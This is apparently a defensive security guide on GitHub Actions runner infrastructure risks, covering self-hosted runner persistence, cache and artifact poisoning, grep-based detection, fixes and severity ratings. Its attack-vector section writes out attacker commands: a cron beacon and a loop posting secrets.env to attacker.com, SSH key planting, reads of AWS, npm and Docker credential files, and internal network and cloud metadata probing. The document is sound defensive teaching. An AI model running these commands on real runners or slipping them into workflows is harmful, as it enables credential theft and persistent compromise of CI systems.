# Runner Infrastructure

## Overview

GitHub Actions runners, caches, and artifacts form the infrastructure layer of CI/CD. Self-hosted runners persist between jobs (unlike GitHub-hosted runners), and cache/artifact poisoning can create cross-workflow attack paths.

---

## Self-Hosted Runner Risks

### Persistence Between Jobs

GitHub-hosted runners are ephemeral — each job gets a fresh VM that's destroyed after use. Self-hosted runners are **persistent** — files, processes, and credentials from one job remain available to the next.

```yaml
# DANGEROUS: Self-hosted runner with pull_request trigger
on: pull_request  # Fork PRs can run on self-hosted runners
jobs:
  build:
    runs-on: self-hosted  # Persistent runner!
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm test
```

### Attack Vectors on Self-Hosted Runners

#### Credential Persistence

```bash
# Attacker's code in a fork PR running on self-hosted runner:

# 1. Install a persistent backdoor
echo '* * * * * curl https://attacker.com/beacon' >> /var/spool/cron/crontabs/runner

# 2. Drop SSH keys
mkdir -p ~/.ssh
echo "attacker-public-key" >> ~/.ssh/authorized_keys

# 3. Steal cached credentials from previous jobs
cat ~/.docker/config.json  # Docker registry credentials
cat ~/.npmrc               # npm tokens
cat ~/.aws/credentials     # AWS credentials from previous deployments
```

#### Process Injection

```bash
# Attacker leaves a background process that intercepts future jobs
nohup bash -c 'while true; do
  if [ -f /home/runner/work/*/secrets.env ]; then
    curl -d @/home/runner/work/*/secrets.env https://attacker.com/collect
  fi
  sleep 10
done' &>/dev/null &
```

#### Network Access

Self-hosted runners often sit inside corporate networks:

```bash
# Attacker uses runner as pivot point
# Scan internal network
nmap -sn 10.0.0.0/24

# Access internal services
curl http://internal-api.corp.example.com/admin
# nosemgrep: skill-cloud-metadata-access
curl http://169.254.169.254/latest/meta-data/  # Cloud metadata (example of attack vector)
```

---

## Cache Poisoning

### How Actions Cache Works

`actions/cache` stores and restores files between workflow runs using a key. The cache is scoped to a branch, but **feature branches can read caches from the default branch**.

```yaml
- uses: actions/cache@v4
  with:
    path: node_modules
    key: npm-${{ hashFiles('package-lock.json') }}
```

### Cache trust boundaries

A normal `pull_request` cache is scoped to its merge ref; matching its key does not let `main` restore it. The older direct fork-cache-to-main example is therefore invalid without another scope-crossing vulnerability. Default/base-branch caches may be readable to PRs, so never cache secrets. Evaluate the current cache access mode and trigger, reusable-workflow limits, restore keys and any privileged workflow that processes untrusted content before saving a cache. A known key alone is not proof of poisoning.

## Artifact Poisoning

### Cross-Workflow Artifact Attacks

`actions/upload-artifact` and `actions/download-artifact` pass data between workflows. If an untrusted workflow uploads an artifact, a trusted workflow that downloads it may execute poisoned content.

```yaml
# Workflow 1: Build (on pull_request — fork code)
on: pull_request
steps:
  - uses: actions/checkout@v4
  - run: npm run build
  - uses: actions/upload-artifact@v4
    with:
      name: build-output
      path: dist/  # Fork code controls what's in dist/

# Workflow 2: Deploy (on workflow_run — trusted)
on:
  workflow_run:
    workflows: [Build]
    types: [completed]
steps:
  - uses: actions/download-artifact@v4
    with:
      name: build-output
      run-id: ${{ github.event.workflow_run.id }}
  - run: ./deploy.sh dist/  # Deploying fork's build output!
```

### Artifact Scope Rules

- Artifacts are scoped to a workflow run
- `workflow_run` triggered workflows can download artifacts from the triggering run
- Transport/digest validation can detect corruption but does not prove a trusted producer. Verify workflow/repository/commit identity and an attestation/signature rooted in a trusted policy when needed.

---

## Detection Patterns

```bash
# Find self-hosted runner usage
grep -rn "runs-on:.*self-hosted" .github/workflows/

# Find cache usage
grep -rn "actions/cache" .github/workflows/

# Find artifact upload/download
grep -rn "actions/upload-artifact\|actions/download-artifact" .github/workflows/

# Check if self-hosted runners are used with PR triggers
for f in .github/workflows/*.yml; do
  if grep -q "self-hosted" "$f" && grep -q "pull_request" "$f"; then
    echo "ALERT: $f uses self-hosted runner with PR trigger"
  fi
done

# Find workflow_run workflows that download artifacts
grep -B5 "download-artifact" .github/workflows/*.yml | grep "workflow_run"

# Check cache keys for predictability
grep -A3 "actions/cache" .github/workflows/*.yml | grep "key:"
```

---

## The Fix

### Self-Hosted Runners

```yaml
# SAFE: Use GitHub-hosted runners for untrusted code
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest  # Ephemeral, destroyed after job
    steps:
      - uses: actions/checkout@v4
      - run: npm test

# If self-hosted runners are required:
# 1. Use ephemeral/auto-scaling runners (actions-runner-controller)
# 2. Never run fork PRs on self-hosted runners
# 3. Use runner groups to isolate trusted/untrusted workloads
```

### Cache Safety

```yaml
# SAFER: Include workflow context in cache key
- uses: actions/cache@v4
  with:
    path: node_modules
    key: npm-${{ github.ref }}-${{ hashFiles('package-lock.json') }}
    # Branch-specific key reduces cross-branch poisoning risk

# SAFEST: Don't cache across trust boundaries
# Use separate cache keys for PR builds vs. main branch builds
```

### Artifact Safety

```yaml
# SAFER: Verify artifact integrity before using
on:
  workflow_run:
    workflows: [Build]
    types: [completed]
jobs:
  deploy:
    # Only deploy artifacts from trusted branches
    if: >-
      github.event.workflow_run.conclusion == 'success' &&
      github.event.workflow_run.event == 'push' &&
      github.event.workflow_run.head_repository.full_name == github.repository &&
      github.event.workflow_run.head_branch == 'main'
    steps:
      - uses: actions/download-artifact@v4
      - run: |
          # Verify a digest/signature from an independently trusted manifest;
          # a checksum file shipped by the same untrusted producer proves no trust.
          sha256sum -c checksums.txt
          ./deploy.sh dist/
```

---

## Severity Guidelines

| Pattern | Severity | Rationale |
|---------|----------|-----------|
| Self-hosted runner with `pull_request` (forks enabled) | **Critical** | Fork code runs on persistent infrastructure |
| Self-hosted runner with `pull_request_target` + fork checkout | **Critical** | Fork code + secrets + persistence |
| Cache used across trust boundaries (PR + main) | **Medium** | Cache poisoning possible but requires key match |
| Artifact downloaded from untrusted workflow run | **High** | Untrusted build output deployed to production |
| Self-hosted runner for `push` to protected branches only | **Low** | Only trusted committers can trigger |

---

## References

- [GitHub Docs: Self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security)
- [GitHub Docs: Caching dependencies](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows)
- [Cycode: GitHub Actions Cache Poisoning](https://cycode.com/blog/github-actions-cache-poisoning/)
